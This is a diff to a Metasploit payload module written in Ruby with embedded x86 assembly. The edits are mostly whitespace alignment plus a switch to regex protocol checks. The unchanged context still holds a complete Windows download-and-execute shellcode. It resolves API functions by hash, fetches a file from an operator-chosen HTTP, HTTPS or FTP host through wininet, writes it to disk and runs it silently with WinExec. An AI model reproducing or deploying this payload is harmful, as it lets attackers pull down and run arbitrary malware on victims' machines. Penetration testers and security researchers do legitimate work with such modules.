@@ -12,7 +12,6 @@
 
 require 'msf/core'
 
-
 module Metasploit3
 
 	include Msf::Payload::Windows
@@ -58,10 +57,10 @@ module Metasploit3
 			#;0x00000200          ; INTERNET_FLAG_NO_UI"
 	
 		exitfuncs = {
-				"PROCESS"	=> 0x56A2B5F0,	#kernel32.dll!ExitProcess
-				"THREAD"	=> 0x0A2A1DE0,	#kernel32.dll!ExitThread
-				"SEH"		=> 0x00000000,	#we don't care
-				"NONE"		=> 0x00000000	#we don't care
+				"PROCESS"   => 0x56A2B5F0,	#kernel32.dll!ExitProcess
+				"THREAD"    => 0x0A2A1DE0,	#kernel32.dll!ExitThread
+				"SEH"       => 0x00000000,	#we don't care
+				"NONE"      => 0x00000000	#we don't care
 				}
 
 		protoflags = {
@@ -85,19 +84,20 @@ module Metasploit3
 		# - port
 		# - /path/to/file
 
-		server_uri = ''
+		server_uri  = ''
 		server_host = ''
-		port_nr	= 443	# default
+		port_nr     = 443	# default
 
 		if target_uri.length > 0
 
 			# get desired protocol
-			if target_uri.start_with?'http://'
+			if target_uri =~ /^http:/
 				proto = "http"
 				port_nr = 80
 				dwflags_asm = "push (0x80000000 | 0x04000000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\n"
 			end
-			if target_uri.start_with?'ftp://'
+
+			if target_uri =~ /^ftp:/
 				proto = "ftp"
 				port_nr = 21
 				dwflags_asm = "push (0x80000000 | 0x04000000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\n"
@@ -107,7 +107,7 @@ module Metasploit3
 			target_uri = target_uri.gsub('http://','')	#don't care about protocol
 			target_uri = target_uri.gsub('https://','')	#don't care about protocol
 			target_uri = target_uri.gsub('ftp://','')	#don't care about protocol
-		
+
 			server_info = target_uri.split("/")
 
 			# did user specify a port ?
@@ -120,7 +120,6 @@ module Metasploit3
 			server_host = server_parts[0]
 
 			# get /path/to/remote/exe
-			
 
 			for i in (1..server_info.length-1)
 				server_uri << "/"
@@ -130,8 +129,6 @@ module Metasploit3
 		end
 
 		# get protocol specific stuff
-		
-		
 
 		#create actual payload
 		payload_data = <<EOS
@@ -148,22 +145,22 @@ api_call:
 	mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
 next_mod:
 	mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
-	movzx ecx, word [edx+38] ; Set ECX to the length we want to check 
+	movzx ecx, word [edx+38] ; Set ECX to the length we want to check
 	xor edi, edi           ; Clear EDI which will store the hash of the module name
-loop_modname:            ;
+loop_modname:              ;
 	xor eax, eax           ; Clear EAX
 	lodsb                  ; Read in the next byte of the name
 	cmp al, 'a'            ; Some versions of Windows use lower case module names
 	jl not_lowercase       ;
 	sub al, 0x20           ; If so normalise to uppercase
-not_lowercase:           ;
+not_lowercase:             ;
 	ror edi, 13            ; Rotate right our hash value
 	add edi, eax           ; Add the next byte of the name
 	loop loop_modname      ; Loop untill we have read enough
 	; We now have the module hash computed
 	push edx               ; Save the current position in the module list for later
 	push edi               ; Save the current module hash for later
-	; Proceed to iterate the export address table, 
+	; Proceed to iterate the export address table,
 	mov edx, [edx+16]      ; Get this modules base address
 	mov eax, [edx+60]      ; Get PE header
 	add eax, edx           ; Add the modules base address
@@ -172,18 +169,18 @@ not_lowercase:           ;
 	jz get_next_mod1       ; If no EAT present, process the next module
 	add eax, edx           ; Add the modules base address
 	push eax               ; Save the current modules EAT
-	mov ecx, [eax+24]      ; Get the number of function names  
+	mov ecx, [eax+24]      ; Get the number of function names
 	mov ebx, [eax+32]      ; Get the rva of the function names
 	add ebx, edx           ; Add the modules base address
 	; Computing the module hash + function hash
-get_next_func:           ;
+get_next_func:             ;
 	jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards), process the next module
 	dec ecx                ; Decrement the function name counter
 	mov esi, [ebx+ecx*4]   ; Get rva of next module name
 	add esi, edx           ; Add the modules base address
 	xor edi, edi           ; Clear EDI which will store the hash of the function name
 	; And compare it to the one we want
-loop_funcname:           ;
+loop_funcname:             ;
 	xor eax, eax           ; Clear EAX
 	lodsb                  ; Read in the next byte of the ASCII function name
 	ror edi, 13            ; Rotate right our hash value
@@ -195,10 +192,10 @@ loop_funcname:           ;
 	jnz get_next_func      ; Go compute the next function hash if we have not found it
 	; If found, fix up stack, call the function and then value else compute the next one...
 	pop eax                ; Restore the current modules EAT
-	mov ebx, [eax+36]      ; Get the ordinal table rva      
+	mov ebx, [eax+36]      ; Get the ordinal table rva
 	add ebx, edx           ; Add the modules base address
 	mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
-	mov ebx, [eax+28]      ; Get the function addresses table rva  
+	mov ebx, [eax+28]      ; Get the function addresses table rva
 	add ebx, edx           ; Add the modules base address
 	mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
 	add eax, edx           ; Add the modules base address to get the functions actual VA
@@ -213,17 +210,17 @@ finish:
 	push ecx               ; Push back the correct return value
 	jmp eax                ; Jump into the required function
 	; We now automagically return to the correct caller...
-get_next_mod:            ;
+get_next_mod:              ;
 	pop eax                ; Pop off the current (now the previous) modules EAT
-get_next_mod1:           ;
+get_next_mod1:             ;
 	pop edi                ; Pop off the current (now the previous) modules hash
 	pop edx                ; Restore our position in the module list
 	mov edx, [edx]         ; Get the next module
-	jmp next_mod     	; Process this module
+	jmp next_mod           ; Process this module
 
 ; actual routine
 start:
-	pop ebp			; get ptr to block_api routine
+	pop ebp                ; get ptr to block_api routine
 ; based on HDM's block_reverse_https.asm
 load_wininet:
 	push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
@@ -263,18 +260,18 @@ internetconnect:
 
 httpopenrequest:
 	pop ecx
-	xor edx, edx           	; NULL
-	push edx               	; dwContext (NULL)
-	#{dwflags_asm}		; dwFlags
-	push edx               	; accept types
-	push edx               	; referrer
-	push edx               	; version
-	push ecx               	; url
-	push edx               	; method
-	push eax               	; hConnection
-	push 0x3B2E55EB        	; hash( "wininet.dll", "HttpOpenRequestA" )
+	xor edx, edx            ; NULL
+	push edx                ; dwContext (NULL)
+	#{dwflags_asm}          ; dwFlags
+	push edx                ; accept types
+	push edx                ; referrer
+	push edx                ; version
+	push ecx                ; url
+	push edx                ; method
+	push eax                ; hConnection
+	push 0x3B2E55EB         ; hash( "wininet.dll", "HttpOpenRequestA" )
 	call ebp
-	mov esi, eax           	; hHttpRequest
+	mov esi, eax            ; hHttpRequest
 
 set_retry:
 	push 0x10
@@ -321,64 +318,64 @@ create_file:
 	jmp get_filename
 
 get_filename_return:
-	xor eax,eax		; zero eax
-	pop edi			; ptr to filename
-	push eax		; hTemplateFile
-	push 2			; dwFlagsAndAttributes (Hidden)
-	push 2			; dwCreationDisposition (CREATE_ALWAYS)
-	push eax		; lpSecurityAttributes
-	push 2			; dwShareMode
-	push 2			; dwDesiredAccess
-	push edi		; lpFileName
-	push 0x4FDAF6DA		; kernel32.dll!CreateFileA
-	call ebp	
+	xor eax,eax       ; zero eax
+	pop edi           ; ptr to filename
+	push eax          ; hTemplateFile
+	push 2            ; dwFlagsAndAttributes (Hidden)
+	push 2            ; dwCreationDisposition (CREATE_ALWAYS)
+	push eax          ; lpSecurityAttributes
+	push 2            ; dwShareMode
+	push 2            ; dwDesiredAccess
+	push edi          ; lpFileName
+	push 0x4FDAF6DA   ; kernel32.dll!CreateFileA
+	call ebp
 
 download_prep:
-	xchg eax, ebx          	; place the file handle in ebx
-	xor eax,eax		; zero eax
-	mov ax,0x304		; we'll download 0x300 bytes at a time
-	sub esp,eax		; reserve space on stack
+	xchg eax, ebx     ; place the file handle in ebx
+	xor eax,eax       ; zero eax
+	mov ax,0x304      ; we'll download 0x300 bytes at a time
+	sub esp,eax       ; reserve space on stack
 
 download_more:
-	push esp               	; &bytesRead
-	lea ecx,[esp+0x8]	; target buffer
+	push esp          ; &bytesRead
+	lea ecx,[esp+0x8] ; target buffer
 	xor eax,eax
-	mov ah,0x03		; eax => 300
-	push eax              	; read length
-	push ecx		; target buffer on stack
-	push esi               	; hRequest
-	push 0xE2899612        	; hash( "wininet.dll", "InternetReadFile" )
+	mov ah,0x03       ; eax => 300
+	push eax          ; read length
+	push ecx          ; target buffer on stack
+	push esi          ; hRequest
+	push 0xE2899612   ; hash( "wininet.dll", "InternetReadFile" )
 	call ebp
 
-	test eax,eax           	; download failed? (optional?)
-	jz thats_all_folks	; failure -> exit
+	test eax,eax        ; download failed? (optional?)
+	jz thats_all_folks  ; failure -> exit
 
-	pop eax			; how many bytes did we retrieve ?
+	pop eax             ; how many bytes did we retrieve ?
 
-	test eax,eax         	; optional?
-	je close_and_run	; continue until it returns 0
+	test eax,eax        ; optional?
+	je close_and_run    ; continue until it returns 0
 
 write_to_file:
-	push 0			; lpOverLapped
-	push esp		; lpNumberOfBytesWritten
-	push eax		; nNumberOfBytesToWrite
-	lea eax,[esp+0xc]	; get pointer to buffer
-	push eax		; lpBuffer
-	push ebx		; hFile
-	push 0x5BAE572D		; kernel32.dll!WriteFile
+	push 0              ; lpOverLapped
+	push esp            ; lpNumberOfBytesWritten
+	push eax            ; nNumberOfBytesToWrite
+	lea eax,[esp+0xc]   ; get pointer to buffer
+	push eax            ; lpBuffer
+	push ebx            ; hFile
+	push 0x5BAE572D     ; kernel32.dll!WriteFile
 	call ebp
-	sub esp,4		; set stack back to where it was
+	sub esp,4           ; set stack back to where it was
 	jmp download_more
 
 close_and_run:
 	push ebx
-	push 0x528796C6		; kernel32.dll!CloseHandle
+	push 0x528796C6    ; kernel32.dll!CloseHandle
 	call ebp
 
 execute_file:
-	push 0			; don't show
-	push edi		; lpCmdLine
-	push 0x876F8B31		; kernel32.dll!WinExec
+	push 0             ; don't show
+	push edi           ; lpCmdLine
+	push 0x876F8B31    ; kernel32.dll!WinExec
 	call ebp
 
 thats_all_folks:
